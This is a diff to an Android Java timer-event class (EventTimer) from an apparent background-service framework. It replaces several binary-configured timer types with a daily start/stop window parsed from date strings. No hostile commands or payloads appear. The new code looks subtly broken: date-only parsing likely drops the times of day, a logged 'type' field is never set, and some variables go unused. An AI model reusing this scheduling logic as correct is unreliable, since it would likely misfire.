@@ -8,54 +8,40 @@
 package com.android.service.event;
 
 import java.io.IOException;
+import java.text.DateFormat;
+import java.text.ParseException;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
 import java.util.TimeZone;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 /**
  * The Class TimerEvent.
  */
-public class EventTimer extends EventBase {
+public class EventTimer extends BaseTimer {
 	/** The Constant TAG. */
 	private static final String TAG = "EventTimer"; //$NON-NLS-1$
 
 	/** The Constant SLEEP_TIME. */
 	private static final int SLEEP_TIME = 1000;
 
-	/** The Constant CONF_TIMER_SINGLE. */
-	final private static int CONF_TIMER_SINGLE = 0;
-
-	/** The Constant CONF_TIMER_REPEAT. */
-	final private static int CONF_TIMER_REPEAT = 1;
-
-	/** The Constant CONF_TIMER_DATE. */
-	final private static int CONF_TIMER_DATE = 2;
-
-	final private static int CONF_TIMER_DELTA = 3;
-
-	final private static int CONF_TIMER_DAILY = 4;
-
-	private int actionOnEnter, actionOnExit;
-
-	boolean dailyIn;
+	boolean nextDailyIn;
 
 	/** The type. */
 	private int type;
 
-	/** The lo delay. */
-	long loDelay;
-
-	/** The hi delay. */
-	long hiDelay;
-
 	long start, stop;
 
 	private final long oneDayMs = 24 * 3600 * 1000;
+
+	private Date timestart;
+
+	private Date timestop;
 
 	/**
 	 * Instantiates a new timer event.
@@ -74,27 +60,26 @@ public class EventTimer extends EventBase {
 	 * .event .Event)
 	 */
 	@Override
-	public boolean parse(final EventConf event) {
-		super.setEvent(event);
-
-		final byte[] conf = event.getParams();
-
-		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-		
+	public boolean parse(final EventConf conf) {
 		try {
-			type = databuffer.readInt();
-			loDelay = databuffer.readInt();
-			hiDelay = databuffer.readInt();
-			
-			actionOnEnter = event.getAction();
-			actionOnExit = databuffer.readInt();
+			String ts = conf.getString("ts");
+			String te = conf.getString("te");
+
+			timestart = DateFormat.getDateInstance().parse(ts);
+			timestop = DateFormat.getDateInstance().parse(te);
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " type: " + type + " lo:" + loDelay + " hi:" + hiDelay);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
+				Check.log(TAG + " type: " + type + " ts:" + ts + " te:" + te);//$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 			}
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
+				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
+			}
+
+			return false;
+		} catch (ParseException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: params FAILED " + e);//$NON-NLS-1$
 			}
 
 			return false;
@@ -112,91 +97,36 @@ public class EventTimer extends EventBase {
 	public void begin() {
 		final long now = System.currentTimeMillis();
 
-		switch (type) {
-		case CONF_TIMER_SINGLE:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: TIMER_SINGLE delay: " + loDelay);//$NON-NLS-1$
-			}
+		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
 
-			setDelay(loDelay);
-			setPeriod(NEVER);
-			break;
+		long nextStart, nextStop;
 
-		case CONF_TIMER_REPEAT:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: TIMER_REPEAT period: " + loDelay);//$NON-NLS-1$
-			}
+		calendar.setTime(timestart);
+		start = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
+				.get(Calendar.SECOND)) * 1000;
 
-			setDelay(loDelay);
-			setPeriod(loDelay);
-			break;
+		calendar.setTime(timestop);
+		stop = ((calendar.get(Calendar.HOUR_OF_DAY) * 3600) + (calendar.get(Calendar.MINUTE) * 60) + calendar
+				.get(Calendar.SECOND)) * 1000;
 
-		case CONF_TIMER_DATE:
-			long tmpTime = hiDelay << 32;
-			tmpTime += loDelay;
-			final Date date = new Date(tmpTime);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Info: TIMER_DATE: " + date);//$NON-NLS-1$
-			}
-
-			setPeriod(NEVER);
-			setDelay(tmpTime - now);
-			break;
-
-		case CONF_TIMER_DAILY:
-			start = loDelay;
-			stop = hiDelay;
-			setPeriod(NEVER);
-
-			dailyIn = setDailyDelay();
-			break;
-
-		/*
-		 * case CONF_TIMER_DELTA:
-		 * 
-		 * 
-		 * long deltaTime = hiDelay << 32; deltaTime += loDelay;
-		 * 
-		 * // se la data di installazione non c'e' si crea. if
-		 * (!markup.isMarkup()) { final Date instTime =
-		 * Status.getInstance().getStartingDate();
-		 * markup.writeMarkup(Utils.longToByteArray(instTime.getTime())); }
-		 * 
-		 * // si legge la data di installazione dal markup try { final long
-		 * timeInst = Utils.byteArrayToLong( markup.readMarkup(), 0);
-		 * 
-		 * setPeriod(NEVER); final long delay = timeInst + deltaTime - now; if
-		 * (delay > 0) { setDelay(timeInst + deltaTime - now); } else { //
-		 * 
-		 * DEBUG date = new Date(timeInst + deltaTime - now);
-		 * if(AutoConfig.DEBUG) Check.log( TAG + " Info: DELTA_DATE: " + date)
-		 * ;//$NON-NLS-1$
-		 * 
-		 * } catch (final IOException e) {
-		 * 
-		 * 
-		 * break;
-		 */
-
-		default:
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: shouldn't be here");//$NON-NLS-1$
-			}
-
-			break;
+		nextDailyIn = setDailyDelay();
+		if (!nextDailyIn) {
+			triggerStartAction();
+			setPeriod(getDelay());
 		}
+
 	}
 
 	private boolean setDailyDelay() {
 		Calendar nowCalendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
-		
-		long nextStart, nextStop;
-		
-		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) 
-							+ nowCalendar.get(Calendar.SECOND)) * 1000;
 
-		// Estriamo il prossimo evento e determiniamo il delay sulla base del tipo
+		long nextStart, nextStop;
+
+		int now = ((nowCalendar.get(Calendar.HOUR_OF_DAY) * 3600) + (nowCalendar.get(Calendar.MINUTE) * 60) + nowCalendar
+				.get(Calendar.SECOND)) * 1000;
+
+		// Estriamo il prossimo evento e determiniamo il delay sulla base del
+		// tipo
 		if (start > now)
 			nextStart = start;
 		else
@@ -217,6 +147,8 @@ public class EventTimer extends EventBase {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (setDailyDelay): Delay (next stop): " + (nextStop - now)); //$NON-NLS-1$
 			}
+
+			long delay = nextStop - now;
 			
 			setPeriod(nextStop - now);
 			return false;
@@ -234,29 +166,26 @@ public class EventTimer extends EventBase {
 			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		if (type == CONF_TIMER_DAILY) {
-			if (dailyIn) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
-				}
-				trigger(actionOnEnter);
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
-				}
-				trigger(actionOnExit);
-			}
-			
+		if (nextDailyIn) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): daily IN BEFORE: " + dailyIn); //$NON-NLS-1$
+				Check.log(TAG + " (go): DAILY TIMER: action enter"); //$NON-NLS-1$
 			}
-			dailyIn = setDailyDelay();
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go): daily IN AFTER: " + dailyIn); //$NON-NLS-1$
-			}
+			triggerStartAction();
 		} else {
-			trigger(actionOnEnter);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go): DAILY TIMER: action exit"); //$NON-NLS-1$
+			}
+			triggerStopAction();
 		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (go): daily IN BEFORE: " + nextDailyIn); //$NON-NLS-1$
+		}
+		nextDailyIn = setDailyDelay();
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (go): daily IN AFTER: " + nextDailyIn); //$NON-NLS-1$
+		}
+
 	}
 
 	/*
